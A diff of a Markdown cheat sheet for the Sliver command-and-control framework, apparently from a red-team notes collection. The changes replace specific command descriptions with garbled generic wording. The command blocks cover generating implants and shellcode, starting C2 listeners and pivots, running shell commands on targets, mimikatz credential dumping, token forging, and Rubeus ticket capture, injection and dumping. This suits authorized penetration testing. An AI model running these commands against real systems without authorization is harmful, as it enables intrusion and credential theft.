@@ -16,27 +16,27 @@ var logon_type = printf '%s\n' 'LOGON_INTERACTIVE' 'LOGON_NETWORK' 'LOGON_BATCH'
 
 ### Start server
 
-Start the Sliver server.
+Start server with Sliver.
 
-```sh title:"Start Sliver server"
+```sh title:"Sliver Start Server"
 sliver server
 ```
 <!-- cheat -->
 
 ### Start client
 
-Start the Sliver client.
+Start client with Sliver.
 
-```sh title:"Start Sliver client"
+```sh title:"Sliver Start Client"
 sliver client
 ```
 <!-- cheat -->
 
 ### Generate implant
 
-Build a sliver implant for the chosen transport (mtls/http/tcp-pivot), OS, and naming. `--skip-symbols` shrinks the binary at the cost of debug info.
+Generate implant with Sliver.
 
-```sh title:"Build implant for chosen transport, OS, and name"
+```sh title:"Sliver Generate Implant"
 generate --$type $lhost:$lport --os $os -N $name $template
 ```
 <!-- cheat
@@ -51,9 +51,9 @@ var template
 
 ### Generate shared library
 
-Build a Windows DLL/shared-library implant over mTLS.
+Generate shared library with Sliver.
 
-```sh title:"Generate Windows DLL over mTLS"
+```sh title:"Sliver Generate Shared Library"
 generate --format shared --mtls $lhost
 ```
 <!-- cheat
@@ -62,9 +62,9 @@ var lhost
 
 ### Generate shellcode
 
-Build Windows shellcode over mTLS.
+Generate shellcode with Sliver.
 
-```sh title:"Generate Windows shellcode over mTLS"
+```sh title:"Sliver Generate Shellcode"
 generate --format shellcode --mtls $lhost
 ```
 <!-- cheat
@@ -73,9 +73,9 @@ var lhost
 
 ### Generate beacon
 
-Build a Sliver beacon implant over mTLS.
+Generate beacon with Sliver.
 
-```sh title:"Generate mTLS beacon implant"
+```sh title:"Sliver Generate Beacon"
 generate beacon --mtls $lhost
 ```
 <!-- cheat
@@ -84,9 +84,9 @@ var lhost
 
 ### Generate DNS canary
 
-Build an mTLS implant with a DNS canary.
+Generate DNS canary with Sliver.
 
-```sh title:"Generate implant with DNS canary"
+```sh title:"Sliver Generate DNS Canary"
 generate --mtls $lhost --canary $canary_domain
 ```
 <!-- cheat
@@ -96,9 +96,9 @@ var canary_domain
 
 ### Generate execution-limited
 
-Build an implant limited to a hostname, username, and domain-joined systems.
+Generate execution limited with Sliver.
 
-```sh title:"Generate implant with execution limits"
+```sh title:"Sliver Generate Execution Limited"
 generate --mtls $lhost --limit-hostname $rhost_name --limit-username $user --limit-domainjoined
 ```
 <!-- cheat
@@ -111,9 +111,9 @@ var user
 
 ### Start TCP pivot
 
-Open a TCP pivot listener on the implant. Other implants can callback through this one to reach the C2.
+Start TCP pivot with Sliver.
 
-```sh title:"Open TCP pivot on implant for nested callbacks"
+```sh title:"Sliver Start TCP Pivot"
 pivot start $rhost_ip:$lport
 ```
 <!-- cheat
@@ -126,9 +126,9 @@ var lport
 
 ### Push tool
 
-Upload a tool from your `$windows_tools` collection straight into the implant session.
+Run push tool with Sliver.
 
-```sh title:"Push tool from $windows_tools into implant session"
+```sh title:"Sliver Run Push Tool"
 upload "$tool"
 ```
 <!-- cheat
@@ -141,9 +141,9 @@ var tool
 
 ### Quick listener
 
-Spin up a listener of the chosen type bound to host:port. One-liner alternative to the verbose `mtls`/`http` commands.
+List quick listener with Sliver.
 
-```sh title:"Spin up listener of chosen type at host:port"
+```sh title:"Sliver List Quick Listener"
 $type -L $rhost_ip -l $lport
 ```
 <!-- cheat
@@ -155,9 +155,9 @@ var lport
 
 ### mTLS listener
 
-Start an mTLS listener.
+List mTLS listener with Sliver.
 
-```sh title:"Start mTLS listener"
+```sh title:"Sliver List MTLS Listener"
 mtls --lhost $lhost --lport $lport
 ```
 <!-- cheat
@@ -167,9 +167,9 @@ var lport
 
 ### HTTP listener
 
-Start an HTTP listener.
+List HTTP listener with Sliver.
 
-```sh title:"Start HTTP listener"
+```sh title:"Sliver List HTTP Listener"
 http --lhost $lhost --lport $lport
 ```
 <!-- cheat
@@ -179,9 +179,9 @@ var lport
 
 ### HTTPS listener
 
-Start an HTTPS listener.
+List HTTPS listener with Sliver.
 
-```sh title:"Start HTTPS listener"
+```sh title:"Sliver List HTTPS Listener"
 https --lhost $lhost --lport $lport
 ```
 <!-- cheat
@@ -191,9 +191,9 @@ var lport
 
 ### DNS listener
 
-Start a DNS listener.
+List DNS listener with Sliver.
 
-```sh title:"Start DNS listener"
+```sh title:"Sliver List DNS Listener"
 dns --lhost $lhost --lport $lport
 ```
 <!-- cheat
@@ -203,9 +203,9 @@ var lport
 
 ### Stage listener
 
-Start a stage listener.
+List stage listener with Sliver.
 
-```sh title:"Start stage listener"
+```sh title:"Sliver List Stage Listener"
 stage-listener --lhost $lhost --lport $lport
 ```
 <!-- cheat
@@ -217,36 +217,36 @@ var lport
 
 ### Jobs
 
-List active Sliver listener jobs.
+List jobs with Sliver.
 
-```sh title:"List Sliver jobs"
+```sh title:"Sliver List Jobs"
 jobs
 ```
 <!-- cheat -->
 
 ### Sessions
 
-List active sessions.
+List sessions with Sliver.
 
-```sh title:"List Sliver sessions"
+```sh title:"Sliver List Sessions"
 sessions
 ```
 <!-- cheat -->
 
 ### Beacons
 
-List active beacons.
+List beacons with Sliver.
 
-```sh title:"List Sliver beacons"
+```sh title:"Sliver List Beacons"
 beacons
 ```
 <!-- cheat -->
 
 ### Use session
 
-Interact with a session.
+Run use session with Sliver.
 
-```sh title:"Use Sliver session"
+```sh title:"Sliver Run Use Session"
 use $session_id
 ```
 <!-- cheat
@@ -255,18 +255,18 @@ var session_id
 
 ### Background
 
-Background the active session.
+Run background with Sliver.
 
-```sh title:"Background active Sliver session"
+```sh title:"Sliver Run Background"
 background
 ```
 <!-- cheat -->
 
 ### Execute
 
-Execute a process in the active session.
+Execute execute with Sliver.
 
-```sh title:"Execute command in Sliver session"
+```sh title:"Sliver Execute Execute"
 execute $command
 ```
 <!-- cheat
@@ -275,9 +275,9 @@ var command
 
 ### Shell
 
-Run a shell command in the active session.
+Spawn shell with Sliver.
 
-```sh title:"Run shell command in Sliver session"
+```sh title:"Sliver Spawn Shell"
 shell $command
 ```
 <!-- cheat
@@ -286,9 +286,9 @@ var command
 
 ### Download
 
-Download a file from the target.
+Download download with Sliver.
 
-```sh title:"Download file from Sliver target"
+```sh title:"Sliver Download Download"
 download $remote_file
 ```
 <!-- cheat
@@ -299,9 +299,9 @@ var remote_file
 
 ### Run mimikatz
 
-Run a mimikatz command through the implant's built-in module. Pre-loaded with common credential dumping commands.
+Run mimikatz with Sliver.
 
-```sh title:"Run mimikatz command via implant built-in module"
+```sh title:"Sliver Run Mimikatz"
 mimikatz $mimicommands
 ```
 <!-- cheat
@@ -312,9 +312,9 @@ import sliver
 
 ### Make token
 
-Forge a logon token for cleartext credentials. Use `.` as domain for local accounts. Pick the LOGON_* type matching the target service.
+Create make token with Sliver.
 
-```sh title:"Forge logon token from cleartext (pick LOGON_* type)"
+```sh title:"Sliver Create Make Token"
 make-token -d $domain -u $user -p '$pass' --logon-type $logon_type
 ```
 <!-- cheat
@@ -330,9 +330,9 @@ var logon_type
 
 ### Coerce monitor (filtered)
 
-Run Rubeus monitor through the implant, filtering on the coerced machine account so you only catch the target's TGT.
+Trigger monitor (filtered) with Sliver.
 
-```sh title:"Rubeus monitor filtered to coerced machine TGT"
+```sh title:"Sliver Trigger Monitor (filtered)"
 rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /filteruser:$rhost_name$ /nowrap
 ```
 <!-- cheat
@@ -347,9 +347,9 @@ var rhost_name
 
 ### Coerce monitor (unfiltered)
 
-Same monitor but unfiltered. Catches every TGT that lands on the host (noisier output).
+Trigger monitor (unfiltered) with Sliver.
 
-```sh title:"Rubeus monitor unfiltered (every inbound TGT)"
+```sh title:"Sliver Trigger Monitor (unfiltered)"
 rubeus -t 30 -- monitor /interval:$interval /runfor:$runfor /nowrap
 ```
 <!-- cheat
@@ -365,18 +365,18 @@ var runfor
 
 ### Inject TGT
 
-Inject a base64 ticket into the current process via Rubeus running through the implant.
+Run inject TGT with Sliver.
 
-```sh title:"Inject base64 ticket into current process via Rubeus"
+```sh title:"Sliver Run Inject TGT"
 rubeus -i -- ptt /ticket:inject_ticket_here
 ```
 <!-- cheat -->
 
 ### Dump tickets
 
-Dump all tickets in the current LSA session.
+Dump tickets with Sliver.
 
-```sh title:"Dump all tickets in current LSA session"
+```sh title:"Sliver Dump Tickets"
 rubeus dump /nowrap 
 ```
 <!-- cheat -->
